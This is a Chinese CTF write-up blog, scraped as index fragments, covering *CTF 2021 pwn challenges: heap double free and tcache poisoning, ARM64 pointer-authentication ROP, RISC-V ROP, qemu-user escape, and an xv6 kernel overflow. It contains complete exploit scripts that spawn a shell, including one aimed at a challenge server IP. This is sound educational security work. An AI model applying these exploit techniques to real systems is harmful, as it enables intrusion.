调试环境搭建","uri":"/2021/01/armpwn/"},{"categories":["PWN"],"content":"赛前科恩那边说二进制的题应该没什么难度，我知道我很弱了不要再说了…放假比较闲那就慢慢复现学习一下吧 babyheap：tcache_struct, double free, 新libc babypac：ARMv8.3, pac, ROP fav arch1：RISC-V64 ROP fav arch2：qemu sandbox bypass, RISC-V ROP babygame： C++析构函数, double free babyxv6：RISC-V, kernel, 自定义漏洞syscall ","date":"2021-01-23","objectID":"/2021/01/starctf2021/:0:0","tags":null,"title":"*CTF 2021","uri":"/2021/01/starctf2021/"},{"categories":["PWN"],"content":"babyheap 用的新libc2.27，添加了类似于2.29的tcache检测，最新的diff如下。提前已经知道了所以这题出的很快，可惜没抢到血。 由于edit改不了前面的8个字节，所以double free只能先打到堆上tcache结构体，使任意分配的同时将0x410的tcache的count填满，让输入name的chunk能直接进入unsorted bin去泄露libc地址，最后tcache poisoning去打free_hook（one_gadget没打通所以没打malloc_hook） #coding:utf-8 from pwn import * # import pwn_framework as pf from time import sleep import sys global io ru = lambda p, x : p.recvuntil(x) sn = lambda p, x : p.send(x) rl = lambda p : p.recvline() sl = lambda p, x : p.sendline(x) rv = lambda p, x=1024 : p.recv(numb = x) sa = lambda p, a, b : p.sendafter(a,b) sla = lambda p, a, b : p.sendlineafter(a,b) rr = lambda p, t : p.recvrepeat(t) rd = lambda p, x : p.recvuntil(x, drop=True) # amd64 or x86 context(arch = 'amd64', endian = 'little') context.log_level = 'debug' filename = \"./pwn\" ip = \"52.152.231.198\" port = 8081 LOCAL = False if len(sys.argv)==1 else False global bps # Break Points global gds # Gdb Debug Symbols bps = [] gds = {} elf = ELF(filename) remote_libc = \"./libc.so.6\" if LOCAL: io = process(filename, aslr=False) libc = ELF(remote_libc) else: context.log_level = 'info' io = remote(ip, port) libc = ELF(remote_libc) def choice(p, idx): sla(p, XXX, str(idx)) def lg(name, val): log.info(name+\" : \"+hex(val)) def add(idx, size): sla(io,\"\u003e\u003e \",'1') sla(io,\"input index\\n\",str(idx)) sla(io,\"input size\\n\",str(size)) def edit(idx, con): sla(io,\"\u003e\u003e \",'3') sla(io,\"input index\\n\",str(idx)) sla(io,\"input content\\n\",con) def free(idx): sla(io,\"\u003e\u003e \",'2') sla(io,\"input index\\n\",str(idx)) def show(idx): sla(io,\"\u003e\u003e \",'4') sla(io,\"input index\\n\",str(idx)) def input_name(name): sla(io,\"\u003e\u003e \",'5') sla(io,\"your name:\\n\",name) def show_name(): sla(io, \"\u003e\u003e \", '6') add(0, 0x60) for i in range(7): free(0) edit(0, str(i)) add(1, 0x50) for i in range(7): free(1) edit(1, str(i)) show(0) heap_addr = u64(io.recv(6)+'\\x00\\x00') lg(\"heap_addr\", heap_addr) free(0) free(1) input_name(p64(heap_addr - 0x260 + 0x40)) for i in range(2): add(2, 0x60) edit(2, p64(0x0707070707070707)) add(3, 0x20) free(0) show(0) libc_addr = u64(io.recv(6)+'\\x00\\x00') - 0x3ebca0 lg(\"libc_addr\", libc_addr) # raw_input() malloc_hook = libc_addr + libc.sym['__malloc_hook'] lg(\"malloc_hook\", malloc_hook) free_hook = libc_addr + libc.sym['__free_hook'] lg(\"free_hook\", free_hook) sys_addr= libc_addr + libc.sym['system'] edit(2, p64(0x0707070707070707)+p64(free_hook-8)*2) one = [0x10a41c, 0x4f432, 0x4f3d5] add(4, 0x20) edit(4, p64(sys_addr)) add(5, 0x40) edit(5, '/bin/sh\\x00'*3) edit(2, p64(0x0707070707070707)+p64(heap_addr+0x10)*3) add(5, 0x30) free(5) io.interactive() ","date":"2021-01-23","objectID":"/2021/01/starctf2021/:1:0","tags":null,"title":"*CTF 2021","uri":"/2021/01/starctf2021/"},{"categories":["PWN"],"content":"babypac arm64架构，装好qemu-user后直接运行cmd就能跑 auth与lock函数都可以负溢出，于是可以充分利用最先输入的name让其成功auth，进入到后门函数sub_400BDC，为qemu-user的arm64栈溢出。题目中pac的意思为Pointer authentication，是ARMv8.3-A对抗ROP攻击的一项技术，攻破该技术便是出题者的意图。 ssize_t sub_400BDC() { __int64 v1; // [xsp+0h] [xbp-20h] BYREF return read(0, \u0026v1, 0x100uLL); // stack_overflow } 如果没有注意到负溢出，直接硬刚sub_4009D8也行，但是注意PACIA命令 unsigned __int64 __fastcall sub_4009D8(__int64 a1) { return a1 ^ (a1 \u003c\u003c 7) ^ ((a1 ^ (unsigned __int64)(a1 \u003c\u003c 7)) \u003e\u003e 11) ^ ((a1 ^ (a1 \u003c\u003c 7) ^ ((a1 ^ (unsigned __int64)(a1 \u003c\u003c 7)) \u003e\u003e 11)) \u003c\u003c 31) ^ ((a1 ^ (a1 \u003c\u003c 7) ^ ((a1 ^ (unsigned __int64)(a1 \u003c\u003c 7)) \u003e\u003e 11) ^ ((a1 ^ (a1 \u003c\u003c 7) ^ ((a1 ^ (unsigned __int64)(a1 \u003c\u003c 7)) \u003e\u003e 11)) \u003c\u003c 31)) \u003e\u003e 13); } 他会先将0x10A9FC70042填充成0x**10A9FC70042，其中**是未知的，然后再进入sub_4009D8进行一系列encode操作，所以只能爆破这两个**，比较麻烦。这一个未知的字节便是PAC，我们稍后也会遇到。 .text:0000000000400D54 loc_400D54 ; CODE XREF: auth+74↑j .text:0000000000400D54 MOV X8, #0x10A9FC70042 .text:0000000000400D60 STR X8, [SP,#0x20+var_10] .text:0000000000400D64 LDR X8, [SP,#0x20+var_10] .text:0000000000400D68 PACIA X8, SP .text:0000000000400D6C STR X8, [SP,#0x20+var_10] .text:0000000000400D70 LDURSW X8, [X29,#var_4] .text:0000000000400D74 ADRL X9, name .text:0000000000400D7C ADD X8, X9, X8,LSL#4 .text:0000000000400D80 LDR X8, [X8,#0x20] .text:0000000000400D84 LDR X0, [SP,#0x20+var_10] .text:0000000000400D88 STR X8, [SP,#0x20+var_20] .text:0000000000400D8C BL encode 而如果利用负溢出漏洞，idx=-1就是我们可控的name区域，所以事先填入0x10A9FC70042后lock(-1)并auth(-1)就能通过校验，进入到栈溢出函数。 我们先把ROP链写好。先简单说一下ARM64的指令集与常识 ARM64 取消了32位的 LDM,STM,PUSH,POP指令，取而代之的是str\\stp、ldr\\ldp ARM64 里面对栈的操作是16字节对齐 sp寄存器在任意时刻会保存栈顶的地址 fp寄存器也称为x29寄存器属于通用寄存器,但是在某些时刻我们利用它保存栈底的地址 x30：链接寄存器（LR），用于保存子程序的返回地址 ARM64用寄存器传参 来看看栈溢出函数，用BL调用了read函数后开始还原栈帧 X29=fp=[SP+0x20]，相当于x86的还原上一个栈帧的rbp X30=LR=[SP+0x28]，ARM64把返回地址放在寄存器LR内，在栈上的位置也是rbp+8 将sp直接向上提0x30，复原栈顶指针 最后retaa返回到返回地址 可以看到ARM64的fp(rbp)是通过直接赋值来还原的，所以在布置ROP链的时候总是要考虑rbp的位置 backdoor ; CODE XREF: auth:loc_400DA0↓p .text:0000000000400BDC .text:0000000000400BDC var_s0 = 0 .text:0000000000400BDC .text:0000000000400BDC PACIASP .text:0000000000400BE0 SUB SP, SP, #0x30 .text:0000000000400BE4 STP X29, X30, [SP,#0x20+var_s0] .text:0000000000400BE8 ADD X29, SP, #0x20 .text:0000000000400BEC MOV W8, WZR .text:0000000000400BF0 MOV X2, #0x100 ; nbytes .text:0000000000400BF4 MOV X1, SP ; buf .text:0000000000400BF8 MOV W0, W8 ; fd .text:0000000000400BFC BL .read .text:0000000000400C00 LDP X29, X30, [SP,#0x20+var_s0] .text:0000000000400C04 ADD SP, SP, #0x30 ; '0' .text:0000000000400C08 RETAA 一般来说可以找一些gadget然后mprotect写shellcode，这里没开NX所以直接在bss段写就行。 参考https://blog.csdn.net/qq_39869547/article/details/105255683 这段gadget位于csu处，是一定会有的 .text:0000000000400FD8 loc_400FD8 ; CODE XREF: sub_400F90+64↓j .text:0000000000400FD8 LDR X3, [X21,X19,LSL#3] .text:0000000000400FDC MOV X2, X24 .text:0000000000400FE0 ADD X19, X19, #1 .text:0000000000400FE4 MOV X1, X23 .text:0000000000400FE8 MOV W0, W22 .text:0000000000400FEC BLR X3 .text:0000000000400FF0 CMP X20, X19 .text:0000000000400FF4 B.NE loc_400FD8 .text:0000000000400FF8 .text:0000000000400FF8 loc_400FF8 ; CODE XREF: sub_400F90+3C↑j .text:0000000000400FF8 LDP X19, X20, [SP,#var_s10] .text:0000000000400FFC LDP X21, X22, [SP,#var_s20] .text:0000000000401000 LDP X23, X24, [SP,#var_s30] .text:0000000000401004 LDP X29, X30, [SP+var_s0],#0x40 .text:0000000000401008 RET 该ROP链的思路是： Info\r\r布置栈帧→ 跳到loc_400FF8控制X19-X30 → 返回到loc_400FD8 → 控制X0-X3（控制参数）→ 跳到X3(read@got) → 写shellcode → 使X20=X19让其不跳回loc_400FD8而继续执行 → 再次控制X19-X30 → 返回到shellcode处getshell\r\r 所以我们的ROP链如下： \"\"\" w0 = w22 x1 = x23 x2 = x24 x3 = [X21+X19\u003c\u003c3] -\u003e read x19 = 0 x20 = 0 x21 = read_addr x22 = 0 x23 = sc_addr x24 = 0x100 x29 = stack_frame \"\"\" fake_fp = 0x412500 // .bss sc_addr = 0x412060 // .bss rop = 'a'*0x20 rop += flat(fake_fp, 0x400FF8, // fp0, ret_addr0 // -\u003ewhen in 0x400FF8, sp is here fake_fp, 0x400FD8, // X29, X30 0, 0, // X19, X20 read_got, 0, //X21, X22-\u003eX0 sc_addr, 0x100, //X23-\u003eX1, X24-\u003eX2 fake_fp, sc_addr ) 这样直接ROP会被PAC拦截 [*] Switching to interactive mode [DEBUG] Received 0","date":"2021-01-23","objectID":"/2021/01/starctf2021/:2:0","tags":null,"title":"*CTF 2021","uri":"/2021/01/starctf2021/"},{"categories":["PWN"],"content":"favourite architecture 1 risc-v架构，64位，用Ghidra9.2反编译。符号表被扬了 undefined8 UndefinedFunction_00010400(void) { ulonglong uVar1; longlong lVar2; undefined auStack488 [192]; undefined auStack296 [256]; ulonglong uStack40; longlong lStack32; int iStack20; FUN_00017d74(PTR_DAT_0006ea28,0); FUN_00017d74(PTR_DAT_0006ea20,0); FUN_00017d74(PTR_DAT_0006ea18,0); FUN_0001605a(\"Input the flag: \"); FUN_00016a5a(auStack296); uVar1 = FUN_000204e4(auStack296); if (uVar1 == ((longlong)(iRam000000000006e9dc + iRam000000000006e9d8) \u0026 0xffffffffU)) { lStack32 = FUN_00020386(auStack296 + ((longlong)iRam000000000006e9d8 \u0026 0xffffffff)); FUN_0001118a(auStack488,\"tzgkwukglbslrmfjsrwimtwyyrkejqzo\",\"oaeqjfhclrqk\",0x80); FUN_000111ea(auStack488,auStack296,iRam000000000006e9d8); lVar2 = FUN_00020e2a(auStack296,\u0026DAT_0006d000,iRam000000000006e9d8); if (lVar2 == 0) { uStack40 = FUN_000204e4(lStack32); iStack20 = 0; while( true ) { if (uStack40 \u003e\u003e 3 \u003c= (ulonglong)(longlong)iStack20) { FUN_00016bc8(\"You are right :D\"); gp = (undefined *)0x6f178; return 0; } FUN_000102ae(iStack20 * 8 + lStack32,\u0026DAT_0006d060); lVar2 = FUN_00020e2a(iStack20 * 8 + lStack32,(longlong)(iStack20 * 8) + 0x6d030,8); if (lVar2 != 0) break; iStack20 = iStack20 + 1; } } } FUN_00016bc8(\"You are wrong ._.\"); gp = (undefined *)0x6f178; return 1; } 用题目给的qemu跑一下 $ ./qemu-riscv64 ./main Input the flag: 1 You are wrong ._. $ 人工fuzz一下，出现段错误 io.sendlineafter(\"Input the flag: \",'a'*0x120+'b'*8) 猜测读入的函数为gets()，没有检测读入长度。 (gdb) c Continuing. Program received signal SIGSEGV, Segmentation fault. 0x6262626262626262 in ?? () (gdb) 边调试边尝试恢复程序主要流程（逆向部分favourite architecture 0省略），是一个RISC-V64的栈溢出。auStack296在s0-0x128处，返回地址距离栈底0x120 undefined8UndefinedFunction_00010400(void){ulonglonguVar1;longlonglVar2;undefinedauStack488[192];undefinedauStack296[256];ulonglonguStack40;longlonglStack32;intiStack20;init_buf(PTR_DAT_0006ea28,0);init_buf(PTR_DAT_0006ea20,0);init_buf(PTR_DAT_0006ea18,0);pRint(\"Input the flag: \");gEts(auStack296);// stack_overflow ...} 下面我们来做RISC-V ROP，控制ra, a0-a2等寄存器便能任意执行函数。 在ghidra中查找包含c.ldsp指令的gadget以控制寄存器，只能直接找到控制saved regs的片段 LAB_0001179e 0001179e e2 70 c.ldsp ra,0x38 (sp) # 栈上内容送reg 000117a0 42 74 c.ldsp s0,0x30 (sp) 000117a2 a2 74 c.ldsp s1,0x28 (sp) 000117a4 02 79 c.ldsp s2,0x20 (sp) 000117a6 e2 69 c.ldsp s3,0x18 (sp) 000117a8 42 6a c.ldsp s4,0x10 (sp) 000117aa a2 6a c.ldsp s5,0x8 (sp) 000117ac 21 61 c.addi16 sp,0x40 # sp += 0x40 000117ae 82 80 ret # jalr ra 但我们知道一定会有把saved regs送往常用寄存器的gadget，实际上就在上面就有一条完整的利用链。由于没有got表，所以通过控制a5并利用0x0011796的跳转来实现任意地址执行。注意与x86不同的是，ret指令并不会改变sp位置。 00011772 93 07 84 b8 addi a5,s0,-0x478 # a5 = s0 - 0x478 00011776 13 09 09 b9 addi s2,s2,-0x470 0001177a 33 09 f9 40 sub s2,s2,a5 # s2 -= 0x470 + a5 0001177e 13 59 39 40 srai s2,s2,0x3 # s2 \u003e\u003e= 3 00011782 63 0e 09 00 beq s2,zero ,LAB_0001179e # s2=0则跳转 LAB_0001178c 0001178c 1c 60 c.ld a5=\u003e-\u003eFUN_00010284 ,0x0 (s0=\u003e-\u003eFUN_00010250 ) 0001178e 56 86 c.mv a2,s5 # s5 -\u003e a2 00011790 d2 85 c.mv a1,s4 # s4 -\u003e a1 00011792 4e 85 c.mv a0,s3 # s3 -\u003e a0 00011794 85 04 c.addi s1,0x1 00011796 82 97 c.jalr a5=\u003eFUN_00010284 # 无条件跳转，并且把下一条指令写进ra（跳回继续执行） 00011798 21 04 c.addi s0,0x8 0001179a e3 19 99 fe bne s2,s1,LAB_0001178c # s1≠s2则跳转 整体思路为 跳到0x1179e控制s0-s5与ra ret到0x11772，使a5=target_fn, s2=0 跳转到0x1179e再次控制s0-s5与ra ret到0x1178e控制a0-a2，执行target_fn，使s1=s2，让其继续执行到0x1179e 控制ra并重新回到main函数 def ROP_ctrl(target_fn, para1, para2, para3): payload = 'a'*0x120 payload += flat(0x1179e, 0, 0, 0, # s5, s4 0, target_fn+0x470, # s3, s2 0, target_fn+0x478, # s1, s0 0x11772, # ra 0, para3, para2, # s5, s4 para1, 1, # s3, s2 0, 0, # s1, s0 0x1178e, # ra 0, 0, 0, 0, 0, 0, 0, # s0-s5 main_addr, # ra ) return payload 至此我们便可以随心所欲地ROP了，最后需要找到orw的系统调用，RISC-V64用a7保存调用号。 openat：FUN_000221cc ************************************************************* * FUNCTION ************************************************************* undefined FUN_000221cc () 000221cc 37 de 06 00 lui t3,0x6d 000221d0 83 3e 0e ba ld t4,-0x460 (t3=\u003eDAT_0006cba0 ) 000221d4 5d 71 c.addi16 sp,-0x50 00","date":"2021-01-23","objectID":"/2021/01/starctf2021/:3:0","tags":null,"title":"*CTF 2021","uri":"/2021/01/starctf2021/"},{"categories":["PWN"],"content":"favourite arch 2 这题要求执行/readflag2，我们必须更进一步拿到shell。 漏洞同样是用户态程序的栈溢出，远程环境中的qemu被patch过，限制了其模拟程序时执行一些syscall，即在riscv层面上无法getshell。所以这题要直接日穿qemu，rce而不只是orw 我们需要进一步理解qemu-user，它将模拟的程序加载到自己进程的内存里，然后读取其中的数据模拟执行。但qemu-user实际上却允许模拟程序的代码访问qemu本体进程的内存（32位由于高地址太高访问不到，但64位却可以），这便是突破口。 来详细看看内存布局，有以下几点值得注意 qemu本体被加载到内存中的地址就是0x555555554000 （aslr=False） 被模拟的程序在很低的地址处 libc仍然在高地址处 0x4000001000是固定的，是qemu给risc-v分配的栈空间 pwndbg\u003e vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x10000 0x6c000 r--p 5c000 0 /mnt/hgfs/linux_share/starctf/favou rite_architecture/share/main 0x6c000 0x6f000 rw-p 3000 5b000 /mnt/hgfs/linux_share/starctf/favou rite_architecture/share/main 0x6f000 0x93000 rw-p 24000 0 0x4000000000 0x4000001000 ---p 1000 0 0x4000001000 0x4000801000 rw-p 800000 0 0x561c72350000 0x561c727b9000 r-xp 469000 0 /mnt/hgfs/linux_share/starctf/favou rite_architecture/share/qemu-riscv64 0x561c729b8000 0x561c729f4000 r--p 3c000 468000 /mnt/hgfs/linux_share/starctf/favou rite_architecture/share/qemu-riscv64 0x561c729f4000 0x561c72a20000 rw-p 2c000 4a4000 /mnt/hgfs/linux_share/starctf/favou rite_architecture/share/qemu-riscv64 0x561c72a20000 0x561c72a3d000 rw-p 1d000 0 0x561c7396a000 0x561c73a13000 rw-p a9000 0 [heap] 0x7fa304000000 0x7fa30bfff000 rwxp 7fff000 0 0x7fa30bfff000 0x7fa30c000000 ---p 1000 0 0x7fa30c000000 0x7fa30c021000 rw-p 21000 0 0x7fa30c021000 0x7fa310000000 ---p 3fdf000 0 0x7fa3114ee000 0x7fa31156f000 rw-p 81000 0 0x7fa31156f000 0x7fa311570000 ---p 1000 0 0x7fa311570000 0x7fa311d75000 rw-p 805000 0 0x7fa311d75000 0x7fa311d76000 r--p 1000 0 /usr/lib/x86_64-linux-gnu/libdl-2.3 1.so 0x7fa311d76000 0x7fa311d78000 r-xp 2000 1000 /usr/lib/x86_64-linux-gnu/libdl-2.3 1.so 0x7fa311d78000 0x7fa311d79000 r--p 1000 3000 /usr/lib/x86_64-linux-gnu/libdl-2.3 1.so 0x7fa311d79000 0x7fa311d7a000 r--p 1000 3000 /usr/lib/x86_64-linux-gnu/libdl-2.3 1.so 0x7fa311d7a000 0x7fa311d7b000 rw-p 1000 4000 /usr/lib/x86_64-linux-gnu/libdl-2.3 1.so 0x7fa311d7b000 0x7fa311d7d000 r--p 2000 0 /usr/lib/x86_64-linux-gnu/libffi.so .7.1.0 0x7fa311d7d000 0x7fa311d83000 r-xp 6000 2000 /usr/lib/x86_64-linux-gnu/libffi.so .7.1.0 0x7fa311d83000 0x7fa311d84000 r--p 1000 8000 /usr/lib/x86_64-linux-gnu/libffi.so .7.1.0 0x7fa311d84000 0x7fa311d85000 ---p 1000 9000 /usr/lib/x86_64-linux-gnu/libffi.so .7.1.0 0x7fa311d84000 0x7fa311d85000 ---p 1000 9000 /usr/lib/x86_64-linux-gnu/[144/367] .7.1.0 0x7fa311d85000 0x7fa311d86000 r--p 1000 9000 /usr/lib/x86_64-linux-gnu/libffi.so .7.1.0 0x7fa311d86000 0x7fa311d87000 rw-p 1000 a000 /usr/lib/x86_64-linux-gnu/libffi.so .7.1.0 0x7fa311d87000 0x7fa311d89000 r--p 2000 0 /usr/lib/x86_64-linux-gnu/libpcre.s o.3.13.3 0x7fa311d89000 0x7fa311dda000 r-xp 51000 2000 /usr/lib/x86_64-linux-gnu/libpcre.s o.3.13.3 0x7fa311dda000 0x7fa311df8000 r--p 1e000 53000 /usr/lib/x86_64-linux-gnu/libpcre.s o.3.13.3 0x7fa311df8000 0x7fa311df9000 r--p 1000 70000 /usr/lib/x86_64-linux-gnu/libpcre.s o.3.13.3 0x7fa311df9000 0x7fa311dfa000 rw-p 1000 71000 /usr/lib/x86_64-linux-gnu/libpcre.s o.3.13.3 0x7fa311dfa000 0x7fa311e04000 r--p a000 0 /usr/lib/x86_64-linux-gnu/libgmp.so .10.4.0 0x7fa311e04000 0x7fa311e64000 r-xp 60000 a000 /usr/lib/x86_64-linux-gnu/libgmp.so .10.4.0 0x7fa311e64000 0x7fa311e7b000 r--p 17000 6a000 /usr/lib/x86_64-linux-gnu/libgmp.so .10.4.0 0x7fa311e7b000 0x7fa311e7c000 ---p 1000 81000 /usr/lib/x86_64-linux-gnu/libgmp.so .10.4.0 0x7fa311e7c000 0x7fa311e7d000 r--p 1000 81000 /usr/lib/x86_64-linux-gnu/libgmp.so .10.4.0 0x7fa311e7d000 0x7fa311e7e000 rw-p 1000 82000 /usr/lib/x86_64-linux-gnu/libgmp.so .10.4.0 0x7fa311e7e000 0x7fa311e85000 r--p 7000 0 /usr/lib/x86_64-linux-gnu/libhogwee d.so.5.0 0x7fa311e85000 0x7fa311e96000 r-xp 11000 7000 /usr/lib/x86_64-linux-gnu/libhogwee d.so.5.0 0x7fa311e96000 0x7fa311eb4000 r--p 1e000 18000 /usr/lib/x86_64-linux-gnu/libhogwee d.so.5.0 0x7fa311eb4000 0x7fa311eb5000 r--p 1000 35000 /usr/lib/x86_64-linux-gnu/libhogwee d.so.5.0 0x7fa311eb5000 0x7fa311eb6000 rw-p 1000 36000 /usr/lib/x86_64-linux-gnu/libhogwee d.so.5.0 0","date":"2021-01-23","objectID":"/2021/01/starctf2021/:4:0","tags":null,"title":"*CTF 2021","uri":"/2021/01/starctf2021/"},{"categories":["PWN"],"content":"babygame 是一个推箱子游戏，每次只能移动一下 (pwn) pwn@ubuntu:~/share/starctf/pwn_babygame$ ./pwn Please input an level from 1-9: 1 Map: ███ █○█ ████□█ █○ □♀███ ███□ □○█ █ ████ █○█ ███ Please input an order: 123 Wrong input, type 'h' for help Please input an order: h Sokoban How to Play: Push all boxs into target place Map: 1)█:wall 2)○:Target 3)□:Box 4)♀:Player 5)●:Box on target Command: 1)h: show this message 2)q: quit the game 3)w: move up 4)s: move down 5)a: move left 6)d: move right 7)b: move back 8)m: leave message k)n: show name 10)l: show message Please input an order: 玩着玩着就崩了…出题人复盘的时候说这题该给源码的，C++我实在是逆不明白… 我们走完一关以后选择level2，q退出以后会触发double free(ubuntu2004)。给的libc是2.27，跑到ubuntu1804继续玩下去，l意外地泄露了libc地址，猜测有什么东西被free后进入unsorted bin 官方wp有点问题…改了一下 ubuntu18.04能打通 from pwn import * import time context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] io = process(\"./pwn\") io.sendlineafter(\"Please input an level from 1-9:\\n\", '1') step = \"wsaadsswdd\" for i in step: io.sendlineafter(\"Please input an order:\\n\", i) io.sendlineafter(\"Please input an level from 1-9:\\n\", '2') io.sendlineafter(\"Please input an order:\\n\", 'q') io.sendlineafter(\"leave your name?\\n\", 'n') io.sendlineafter(\"restart?\\n\", 'y') io.sendlineafter(\"Please input an level from 1-9:\\n\", 'l') io.recvuntil(\"message:\") libc_base = u64(io.recv(6) + '\\x00\\x00') - 0x3ebca0 success(\"libc_base : @\"+hex(libc_base)) def edit(info): io.sendlineafter(\"Please input an level from 1-9:\\n\", 'q') io.sendlineafter(\"leave your name?\\n\", 'y') io.sendlineafter(\"your name:\", info) io.sendlineafter(\"restart?\", 'y') libc = ELF(\"./pwn\").libc freehook = libc.sym['__free_hook'] + libc_base success(\"freehook : @\"+hex(freehook)) payload = p64(freehook) payload = payload.ljust(0x50,'a') edit(payload) edit(payload) system = libc.sym[\"system\"] + libc_base success(\"system : @\"+hex(system)) payload = p64(system) payload = payload.ljust(0x50,'a') edit(payload) edit(payload) io.sendlineafter(\"Please input an level from 1-9\",'1') io.sendafter(\"Please input an order:\",'m\\n') io.sendafter(\"message:\",'/bin/sh\\x00\\n') io.sendafter(\"Please input an order:\",'q\\n') io.sendafter(\"leave your name?\",'n\\n') io.interactive() ","date":"2021-01-23","objectID":"/2021/01/starctf2021/:5:0","tags":null,"title":"*CTF 2021","uri":"/2021/01/starctf2021/"},{"categories":["PWN"],"content":"babyxv6 share：编译好的 fs.img：文件系统镜像 kernel：内核 run.sh：启动脚本 src：源码 找到user的源码，程序执行逻辑如下 void challenge() { int size; char input[0x80]; printf(\"Welcome to babystack 2021!\\n\"); printf(\"How many bytes do you want to send?\\n\"); size = readnum(); if (size \u003e 0x1000) { printf(\"You are greedy!\\n\"); return; } printf(\"show me your input\\n\"); read(0, input, 0x80); baby(input, size); printf(\"It's time to say goodbye.\\n\"); return; } sysproc.中增加了sys_baby系统调用 uint64 sys_baby(void) { int n; uint64 p; char pad[0x100]; if (argint(1, \u0026n) \u003c 0 || argaddr(0, \u0026p) \u003c 0) return -1; return do_overflow(p, n); } uint64 do_overflow(uint64 src, int sz) { char buf[0x20]; return copyin(myproc()-\u003epagetable, buf, src, sz); } copyin调用了memmove，从用户栈传n个字节到dst // Copy from user to kernel. // Copy len bytes to dst from virtual address srcva in a given page table. // Return 0 on success, -1 on error. int copyin(pagetable_t pagetable, char *dst, uint64 srcva, uint64 len) { uint64 n, va0, pa0; while (len \u003e 0) { va0 = PGROUNDDOWN(srcva); pa0 = walkaddr(pagetable, va0); if (pa0 == 0) return -1; n = PGSIZE - (srcva - va0); if (n \u003e len) n = len; memmove(dst, (void *)(pa0 + (srcva - va0)), n); // user stack -\u003e dst[0:n] len -= n; dst += n; srcva = va0 + PGSIZE; } return 0; } 调用链为： baby(input, size) do_overflow(p, n) p = input, n = size memmove(dst, src, n) dst = buf, src = input, n = size 所以baby()是将input的内容传size大小给do_overflow()中的buf[0x20]，由于size可控，所以可以溢出内核态的buf 这里的思路的是利用do_overflow返回时的寄存器a0,a1,a2分别正好是0, (void *)(pa0 + (srcva - va0)), n，如果返回到read函数就能直接往用户栈上读，做riscv用户态的栈溢出 把kernel objdump下来，返回地址在buf+0x28处 00000000800041be \u003cdo_overflow\u003e: 800041be: 7139 addi sp,sp,-64 800041c0: fc06 sd ra,56(sp) # ra = sp+56 800041c2: f822 sd s0,48(sp) 800041c4: 0080 addi s0,sp,64 # s0 -\u003e stack_top 800041c6: fca43423 sd a0,-56(s0) 800041ca: 87ae mv a5,a1 800041cc: fcf42223 sw a5,-60(s0) 800041d0: ffffe097 auipc ra,0xffffe 800041d4: 450080e7 jalr 1104(ra) # 80002620 \u003cmyproc\u003e 800041d8: 87aa mv a5,a0 800041da: 6bbc ld a5,80(a5) 800041dc: fc442683 lw a3,-60(s0) 800041e0: fd040713 addi a4,s0,-48 # a4 = s0-48 = sp+16 800041e4: fc843603 ld a2,-56(s0) 800041e8: 85ba mv a1,a4 # a4 -\u003e buf 800041ea: 853e mv a0,a5 800041ec: ffffe097 auipc ra,0xffffe 800041f0: fd4080e7 jalr -44(ra) # 800021c0 \u003ccopyin\u003e 800041f4: 87aa mv a5,a0 800041f6: 853e mv a0,a5 800041f8: 70e2 ld ra,56(sp) 800041fa: 7442 ld s0,48(sp) 800041fc: 6121 addi sp,sp,64 800041fe: 8082 ret 接下来是内核态的一些函数 在内核里read由consoleread()实现 // console.c consoleinit(void) { initlock(\u0026cons.lock, \"cons\"); uartinit(); // connect read and write system calls // to consoleread and consolewrite. devsw[CONSOLE].read = consoleread; devsw[CONSOLE].write = consolewrite; } usertrap用于响应用户态的syscall、异常等，在最后利用usertrapret()返回到用户态 // // handle an interrupt, exception, or system call from user space. // called from trampoline.S // void usertrap(void) { int which_dev = 0; if((r_sstatus() \u0026 SSTATUS_SPP) != 0) panic(\"usertrap: not from user mode\"); // send interrupts and exceptions to kerneltrap(), // since we're now in the kernel. w_stvec((uint64)kernelvec); struct proc *p = myproc(); // save user program counter. p-\u003etrapframe-\u003eepc = r_sepc(); if(r_scause() == 8){ // system call if(p-\u003ekilled) exit(-1); // sepc points to the ecall instruction, // but we want to return to the next instruction. p-\u003etrapframe-\u003eepc += 4; // an interrupt will change sstatus \u0026c registers, // so don't enable until done with those registers. intr_on(); syscall(); } else if((which_dev = devintr()) != 0){ // ok } else { printf(\"usertrap(): unexpected scause %p pid=%d\\n\", r_scause(), p-\u003epid); printf(\" sepc=%p stval=%p\\n\", r_sepc(), r_stval()); p-\u003ekilled = 1; } if(p-\u003ekilled) exit(-1); // give up the CPU if this is a timer interrupt. if(which_dev == 2) yield(); usertrapret(); } 我们先跳到consoleread，再usertrapret回到用户态 payload = 'a'*0x28 + p64(elf.sym['consoleread']+6) payload += 'a'*0x28 + p64(elf.sym['usertrapret']) r.sendlineafter(\"send?\\n\", str(0xc0)) r.sendlineafter(\"input\\n\", payload) 读risc-v的shellcode到用户栈上，返回到用户态再通过栈溢出ret","date":"2021-01-23","objectID":"/2021/01/starctf2021/:6:0","tags":null,"title":"*CTF 2021","uri":"/2021/01/starctf2021/"},{"categories":["PWN"],"content":"2019年美国国家安全局(NSA)免费向公众开放其逆向工程框架，集成出工具ghidra并在当年3月登陆github。最近碰到一题risc-v架构（*ctf2021 favourite architecture），需要用ghidra反编译辅助分析，以其为例记录动态与静态调试环境搭建。 $ checksec ./main [*] '/mnt/hgfs/linux_share/starctf/favourite_architecture/share/main' Arch: em_riscv-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x10000) RWX: Has RWX segments ","date":"2021-01-22","objectID":"/2021/01/riscv-pwn/:0:0","tags":null,"title":"RISC-V PWN 调试环境搭建","uri":"/2021/01/riscv-pwn/"},{"categories":["PWN"],"content":"静态调试 ","date":"2021-01-22","objectID":"/2021/01/riscv-pwn/:1:0","tags":null,"title":"RISC-V PWN 调试环境搭建","uri":"/2021/01/riscv-pwn/"},{"categories":["PWN"],"content":"下载与使用ghidra 下载略 快捷键见[3] L 重命名函数 G 跳转到 ctrl+shift+E 查找 …… ","date":"2021-01-22","objectID":"/2021/01/riscv-pwn/:1:1","tags":null,"title":"RISC-V PWN 调试环境搭建","uri":"/2021/01/riscv-pwn/"},{"categories":["PWN"],"content":"踩坑记录 反编译(decompiling)窗口显示unknown error，无法反编译除entry以外的函数 见参考资料[1]，需要设置手动gp（全局寄存器） 在entrypoint最后(0x00101ec)能计算出或者直接在entry的反编译窗口看到gp的正确值为0x6f178 ************************************************************* * FUNCTION ************************************************************* undefined entry () assume gp = 0x6f178 undefined a0:1 \u003cRETURN\u003e entry XREF[3]: Entry Point (*) , 00010018 (*) , 00067e94 (*) 000101c0 ef 00 c0 02 jal 